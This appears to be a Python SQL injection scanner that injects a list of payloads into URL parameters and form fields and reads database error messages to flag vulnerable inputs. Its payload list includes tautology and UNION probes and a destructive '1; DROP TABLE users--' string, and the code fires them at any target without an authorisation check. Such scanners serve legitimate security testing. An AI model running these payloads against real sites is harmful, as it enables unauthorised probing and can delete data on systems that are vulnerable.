import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "\" OR \"1\"=\"1",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' AND SLEEP(0)--",
    "1; DROP TABLE users--",
]

SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "syntax error or access violation",
    "mysql_fetch",
    "sqlstate",
    "ora-00933",
    "ora-00907",
    "microsoft jet database engine",
    "odbc microsoft access",
    "pg_query",
    "supplied argument is not a valid mysql",
    "sqlite3",
    "mysql_num_rows",
    "mysql_query",
]


class SQLiScanner:
    def __init__(self, timeout=10):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "WebVulnScanner/1.0 (Educational Tool)"
        })

    def scan(self, base_url, forms):
        findings = []
        findings.extend(self._scan_url(base_url))
        for form in forms:
            findings.extend(self._scan_form(form))
        return findings

    def _scan_url(self, url):
        findings = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for param in params:
            for payload in SQLI_PAYLOADS:
                test_params = dict(params)
                test_params[param] = [payload]
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                try:
                    resp = self.session.get(test_url, timeout=self.timeout)
                    if self._has_sql_error(resp.text):
                        findings.append({
                            "type": "SQL Injection",
                            "severity": "HIGH",
                            "url": test_url,
                            "parameter": param,
                            "payload": payload,
                            "evidence": self._extract_error(resp.text),
                            "description": f"SQL error detected with payload '{payload}' in URL parameter '{param}'"
                        })
                        break
                except Exception:
                    pass
        return findings

    def _scan_form(self, form):
        findings = []
        for inp in form["inputs"]:
            for payload in SQLI_PAYLOADS:
                data = {i["name"]: i["value"] for i in form["inputs"]}
                data[inp["name"]] = payload
                try:
                    if form["method"] == "POST":
                        resp = self.session.post(form["url"], data=data, timeout=self.timeout)
                    else:
                        resp = self.session.get(form["url"], params=data, timeout=self.timeout)
                    if self._has_sql_error(resp.text):
                        findings.append({
                            "type": "SQL Injection",
                            "severity": "HIGH",
                            "url": form["url"],
                            "parameter": inp["name"],
                            "payload": payload,
                            "evidence": self._extract_error(resp.text),
                            "description": f"SQL error via form field '{inp['name']}' with payload '{payload}'"
                        })
                        break
                except Exception:
                    pass
        return findings

    def _has_sql_error(self, text):
        lower = text.lower()
        return any(err in lower for err in SQL_ERRORS)

    def _extract_error(self, text):
        lower = text.lower()
        for err in SQL_ERRORS:
            idx = lower.find(err)
            if idx != -1:
                return text[max(0, idx - 20):min(len(text), idx + 100)].strip()
        return "SQL error pattern detected"
